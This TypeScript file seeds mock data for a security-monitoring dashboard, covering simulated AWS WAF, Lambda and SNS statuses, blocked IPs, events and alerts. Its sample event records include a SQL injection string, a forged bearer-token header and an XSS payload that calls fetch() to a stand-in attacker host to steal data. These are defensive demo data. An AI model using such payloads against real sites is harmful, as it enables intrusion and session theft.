import { SecurityEvent, BlockedIP, ServiceStatus, DashboardMetrics, NotificationAlert } from '../types/security';

export const INITIAL_SERVICES: Record<string, ServiceStatus> = {
  waf: {
    id: 'waf',
    serviceName: 'AWS WAF',
    awsEquivalent: 'AWS WAF (Web Application Firewall)',
    status: 'ACTIVE',
    eventCount: 14280,
    lastActivity: 'Just now',
    currentOperation: 'Inspecting live Layer-7 traffic rulesets',
    description: 'Protects web applications from common web exploits and bots that affect availability and security.',
    metricsLabel: 'Rules Evaluated',
    metricsValue: '14,280 / hr'
  },
  ai: {
    id: 'ai',
    serviceName: 'AI Threat Engine',
    awsEquivalent: 'Amazon Bedrock / SageMaker Enhanced',
    status: 'ACTIVE',
    eventCount: 384,
    lastActivity: 'Just now',
    currentOperation: 'Dynamic contextual anomaly scoring & heuristic synthesis',
    description: 'Special enhancement evaluating threat intent, multi-factor confidence, severity, and response synthesis.',
    metricsLabel: 'Avg Model Inference',
    metricsValue: '18ms'
  },
  lambda: {
    id: 'lambda',
    serviceName: 'AWS Lambda',
    awsEquivalent: 'AWS Lambda (Serverless Compute)',
    status: 'ACTIVE',
    eventCount: 384,
    lastActivity: 'Just now',
    currentOperation: 'processSecurityEvent trigger ready',
    description: 'Event-driven serverless functions that automatically execute response workflows upon WAF detection.',
    metricsLabel: 'Success Rate',
    metricsValue: '99.98%'
  },
  dynamodb: {
    id: 'dynamodb',
    serviceName: 'Amazon DynamoDB',
    awsEquivalent: 'Amazon DynamoDB (NoSQL)',
    status: 'ACTIVE',
    eventCount: 384,
    lastActivity: 'Just now',
    currentOperation: 'Table `CloudShield_SecurityEvents` online',
    description: 'High-throughput, single-digit millisecond latency NoSQL database storing all security event logs and state.',
    metricsLabel: 'Table Write Capacity',
    metricsValue: '500 WCU'
  },
  cloudwatch: {
    id: 'cloudwatch',
    serviceName: 'Amazon CloudWatch',
    awsEquivalent: 'Amazon CloudWatch (Logs & Metrics)',
    status: 'ACTIVE',
    eventCount: 14280,
    lastActivity: 'Just now',
    currentOperation: 'Publishing metric streams and anomaly alarms',
    description: 'Observability platform monitoring request rates, error spikes, and security alarms in real-time.',
    metricsLabel: 'Active Alarms',
    metricsValue: '2 Configured'
  },
  sns: {
    id: 'sns',
    serviceName: 'Amazon SNS',
    awsEquivalent: 'Amazon Simple Notification Service',
    status: 'ACTIVE',
    eventCount: 28,
    lastActivity: '12m ago',
    currentOperation: 'Topic `cloudshield-soc-critical-alerts` active',
    description: 'Fully managed pub/sub messaging delivering instant high-priority alerts to SOC engineers.',
    metricsLabel: 'Subscribers',
    metricsValue: '8 SOC Endpoints'
  }
};

export const INITIAL_BLOCKED_IPS: BlockedIP[] = [
  {
    ip: '198.51.100.42',
    reason: 'Critical SQL Injection exploit against /api/auth',
    attackType: 'SQL Injection',
    firstDetected: '2026-10-07 16:20:14',
    lastDetected: '2026-10-07 18:14:02',
    threatScore: 96,
    status: 'ACTIVE',
    eventCount: 8
  },
  {
    ip: '203.0.113.88',
    reason: 'Layer 7 HTTP Flood Volumetric DDoS burst',
    attackType: 'DDoS / Traffic Spike',
    firstDetected: '2026-10-07 17:05:30',
    lastDetected: '2026-10-07 18:02:11',
    threatScore: 92,
    status: 'ACTIVE',
    eventCount: 12
  },
  {
    ip: '192.0.2.145',
    reason: 'Brute Force Credential stuffing on /login',
    attackType: 'Brute Force',
    firstDetected: '2026-10-07 17:45:00',
    lastDetected: '2026-10-07 18:25:39',
    threatScore: 84,
    status: 'ACTIVE',
    eventCount: 5
  },
  {
    ip: '198.51.100.19',
    reason: 'Unauthorized access attempts to /.env and /admin',
    attackType: 'Unauthorized Access',
    firstDetected: '2026-10-07 15:10:22',
    lastDetected: '2026-10-07 16:50:09',
    threatScore: 88,
    status: 'ACTIVE',
    eventCount: 4
  }
];

export const INITIAL_EVENTS: SecurityEvent[] = [
  {
    eventId: 'EVT-1042',
    timestamp: '2026-10-07 18:21:43',
    sourceIp: '198.51.100.42',
    attackType: 'SQL Injection',
    attackTypeId: 'sqli',
    target: '/login',
    method: 'POST',
    payloadLabel: "' OR '1'='1' -- admin",
    intensity: 'Medium',
    requestCount: 1,
    wafRule: 'AWS-WAF-SQLI-001',
    wafAction: 'BLOCK',
    aiCategory: 'SQL Injection (CWE-89)',
    aiConfidence: 96,
    threatScore: 94,
    severity: 'CRITICAL',
    aiReason: [
      'Sensitive authentication endpoint targeted (/login)',
      'Suspicious SQL syntax tokens (OR 1=1) detected in body',
      'High probability of remote database exfiltration',
      'Signature matches AWS-WAF-SQLI-001'
    ],
    recommendedAction: 'BLOCK source IP and record security event',
    lambdaStatus: 'SUCCESS',
    storageStatus: 'STORED',
    monitoringStatus: 'ANOMALY_RECORDED',
    notificationStatus: 'SENT',
    finalAction: 'BLOCK_ALERT',
    finalStatus: 'RESOLVED'
  },
  {
    eventId: 'EVT-1041',
    timestamp: '2026-10-07 18:18:10',
    sourceIp: '203.0.113.88',
    attackType: 'DDoS / Traffic Spike',
    attackTypeId: 'ddos',
    target: '/api/products',
    method: 'GET',
    payloadLabel: 'HTTP GET flood burst 500 req/s',
    intensity: 'High',
    requestCount: 500,
    wafRule: 'AWS-WAF-RATE-001',
    wafAction: 'RATE_LIMIT',
    aiCategory: 'Layer-7 Volumetric Denial of Service',
    aiConfidence: 98,
    threatScore: 92,
    severity: 'CRITICAL',
    aiReason: [
      'Abnormal request volume spike exceeding 99th percentile baseline',
      'Rapid resource starvation pattern targeting thread pool',
      'Immediate availability threat to downstream services'
    ],
    recommendedAction: 'Apply rate limiting and temporarily block IP burst',
    lambdaStatus: 'SUCCESS',
    storageStatus: 'STORED',
    monitoringStatus: 'ANOMALY_RECORDED',
    notificationStatus: 'SENT',
    finalAction: 'BLOCK',
    finalStatus: 'BLOCKED'
  },
  {
    eventId: 'EVT-1040',
    timestamp: '2026-10-07 18:14:22',
    sourceIp: '192.168.1.50',
    attackType: 'Normal Request',
    attackTypeId: 'normal',
    target: '/dashboard',
    method: 'GET',
    payloadLabel: 'Standard Web Navigation',
    intensity: 'Low',
    requestCount: 1,
    wafRule: 'DEFAULT-ALLOW-001',
    wafAction: 'ALLOW',
    aiCategory: 'Benign Application Traffic',
    aiConfidence: 99,
    threatScore: 4,
    severity: 'LOW',
    aiReason: [
      'Request matches expected baseline user behavioral profile',
      'Payload passes strict alphanumeric and schema validations',
      'No rate-limiting anomalies'
    ],
    recommendedAction: 'ALLOW request through to backend application servers.',
    lambdaStatus: 'BYPASSED',
    storageStatus: 'STORED',
    monitoringStatus: 'NORMAL',
    notificationStatus: 'NOT_REQUIRED',
    finalAction: 'ALLOW',
    finalStatus: 'ALLOWED'
  },
  {
    eventId: 'EVT-1039',
    timestamp: '2026-10-07 18:09:55',
    sourceIp: '192.0.2.145',
    attackType: 'Brute Force',
    attackTypeId: 'bruteforce',
    target: '/api/auth/token',
    method: 'POST',
    payloadLabel: 'Dictionary Spray 25 credentials',
    intensity: 'High',
    requestCount: 25,
    wafRule: 'AWS-WAF-AUTH-001',
    wafAction: 'RATE_LIMIT',
    aiCategory: 'Authentication Credential Stuffing',
    aiConfidence: 94,
    threatScore: 84,
    severity: 'HIGH',
    aiReason: [
      'High velocity of failed authentication attempts in burst window',
      'Identical source IP rotating credentials against login endpoint',
      'Account takeover risk identified'
    ],
    recommendedAction: 'BLOCK REQUEST: Apply WAF drop policy and track source IP reputation',
    lambdaStatus: 'SUCCESS',
    storageStatus: 'STORED',
    monitoringStatus: 'ANOMALY_RECORDED',
    notificationStatus: 'SENT',
    finalAction: 'BLOCK',
    finalStatus: 'RESOLVED'
  },
  {
    eventId: 'EVT-1038',
    timestamp: '2026-10-07 18:02:40',
    sourceIp: '198.51.100.19',
    attackType: 'Unauthorized Access',
    attackTypeId: 'unauthorized',
    target: '/admin/config/backup',
    method: 'GET',
    payloadLabel: 'Header: Authorization: Bearer forged-token-null',
    intensity: 'Medium',
    requestCount: 3,
    wafRule: 'AWS-WAF-ACCESS-001',
    wafAction: 'BLOCK',
    aiCategory: 'Broken Access Control & Privilege Escalation',
    aiConfidence: 95,
    threatScore: 88,
    severity: 'HIGH',
    aiReason: [
      'Direct access attempt to restricted administrative configuration endpoint',
      'Missing or invalid cryptographically signed JWT token',
      'Explicit violation of zero-trust security perimeter'
    ],
    recommendedAction: 'BLOCK source IP and notify security operators',
    lambdaStatus: 'SUCCESS',
    storageStatus: 'STORED',
    monitoringStatus: 'ANOMALY_RECORDED',
    notificationStatus: 'SENT',
    finalAction: 'BLOCK_ALERT',
    finalStatus: 'RESOLVED'
  },
  {
    eventId: 'EVT-1037',
    timestamp: '2026-10-07 17:55:12',
    sourceIp: '198.51.100.77',
    attackType: 'Cross-Site Scripting (XSS)',
    attackTypeId: 'xss',
    target: '/search',
    method: 'GET',
    payloadLabel: '<script>fetch("http://attacker.local/steal")</script>',
    intensity: 'Medium',
    requestCount: 1,
    wafRule: 'AWS-WAF-XSS-001',
    wafAction: 'BLOCK',
    aiCategory: 'Cross-Site Scripting (CWE-79)',
    aiConfidence: 93,
    threatScore: 82,
    severity: 'HIGH',
    aiReason: [
      'Executable client-side script tags identified',
      'Reflected input vector without sanitization filter matching',
      'Risk of session cookie theft or DOM manipulation'
    ],
    recommendedAction: 'BLOCK request and sanitize input query',
    lambdaStatus: 'SUCCESS',
    storageStatus: 'STORED',
    monitoringStatus: 'ANOMALY_RECORDED',
    notificationStatus: 'SENT',
    finalAction: 'BLOCK',
    finalStatus: 'BLOCKED'
  }
];

export const INITIAL_NOTIFICATIONS: NotificationAlert[] = [
  {
    id: 'NOTIF-01',
    timestamp: '18:21:44',
    title: '🚨 CRITICAL SECURITY ALERT: SQL Injection Detected',
    sourceIp: '198.51.100.42',
    attackType: 'SQL Injection',
    severity: 'CRITICAL',
    threatScore: 94,
    message: 'AWS WAF blocked malicious SQL injection payload targeting /login. Source IP isolated and added to security blocklist.',
    actionTaken: 'SOURCE BLOCKED & LOGGED',
    read: false
  },
  {
    id: 'NOTIF-02',
    timestamp: '18:18:11',
    title: '🚨 CRITICAL ALERT: Volumetric DDoS Traffic Burst',
    sourceIp: '203.0.113.88',
    attackType: 'DDoS / Traffic Spike',
    severity: 'CRITICAL',
    threatScore: 92,
    message: 'CloudWatch alarm triggered: Rate limit exceeded (500 req/sec) targeting /api/products. Temporary throttle applied.',
    actionTaken: 'RATE LIMITED & ISOLATED',
    read: true
  }
];

export const INITIAL_METRICS: DashboardMetrics = {
  totalRequests: 14280,
  blockedRequests: 2341,
  threatsDetected: 27,
  criticalThreats: 6,
  activeBlockedIps: 4,
  systemHealth: '100% HEALTHY',
  requestsPerMinute: 238,
  allowedRequests: 11939
};
